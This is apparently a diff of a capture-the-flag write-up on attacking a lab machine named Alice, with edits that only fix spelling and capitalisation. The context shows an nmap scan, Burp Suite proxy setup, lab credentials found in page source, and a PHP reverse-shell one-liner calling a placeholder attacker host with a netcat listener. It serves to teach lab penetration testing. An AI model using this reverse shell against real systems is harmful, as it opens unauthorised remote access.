@@ -27,9 +27,9 @@ This will allow me to detect any IP that exists in this range.
 </figcaption>
 </figure>
 
-As seen there are 4 IPs shown, only one of these is the ip of the alice machine. since *.1* and *.254* are the network and broadcast ip respectively, these leaves *.156* and *.2* but *.2* is most likely the gateway address.
+As seen there are 4 IPs shown, only one of these is the IP of the Alice machine. since *.1* and *.254* are the network and broadcast IP respectively, these leaves *.156* and *.2* but *.2* is most likely the gateway address.
 
-I can further test this by performing and NMAP scan on the ip 192.168.220.156.
+I can further test this by performing and NMAP scan on the IP 192.168.220.156.
 
     nmap -A 192.168.220.156
 
@@ -40,7 +40,7 @@ I can further test this by performing and NMAP scan on the ip 192.168.220.156.
 </figcaption>
 </figure>
 
-Boom so now I know that there are 2 open ports I can use. But one of them being port 80 with an apache version shows that there's a website. So now I'm going to see if i can access the website normally.
+Boom so now I know that there are 2 open ports I can use. But one of them being port 80 with an apache version shows that there's a website. So now I'm going to see if I can access the website normally.
 
 <figure>
 <img src="/img/Untitled 2.png" >
@@ -92,7 +92,7 @@ So before setting it up I have to make the necessary changes to Firefox
 </figcaption>
 </figure>
 
-- So we have to change the proxy setting in Firefox to be the same as the proxy listener in Burp Suite. By going to the bottom of preferences in Network Proxy and changing the configure proxy to manual and inputting the HTTP Proxy as the same ip and Port: *127.0.0.1 8080 .*
+- So we have to change the proxy setting in Firefox to be the same as the proxy listener in Burp Suite. By going to the bottom of preferences in Network Proxy and changing the configure proxy to manual and inputting the HTTP Proxy as the same IP and Port: *127.0.0.1 8080 .*
 
 Now that this is configured we can refresh the page and capture the page.
 
@@ -138,9 +138,9 @@ Inserting that should allow us to gain access to local given the two hints.
 </figcaption>
 </figure>
 
-Perfect, I gained access to the proper page. Now lets have alook around.
+Perfect, I gained access to the proper page. Now let’s have a look around.
 
-There was nothing of notability so now Im going to register to see if there anything else.
+There was nothing of notability so now I’m going to register to see if there anything else.
 
 <figure>
 <img src="/img/Untitled 13.png" >
@@ -176,7 +176,7 @@ Bingo, Alice. Now that we found her profile, we need to find out the password.
 </figcaption>
 </figure>v
 
-In the source code weve got the username and password,
+In the source code we’ve got the username and password,
 
     alice
     4lice3
@@ -221,7 +221,7 @@ After doing some researching into it, I found a cheat sheet for reverse shells a
 
     php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-This along side netcat should allow me to gain access through the kali machine using the following command
+This alongside netcat should allow me to gain access through the kali machine using the following command
 
     nc -nvlp 80
 
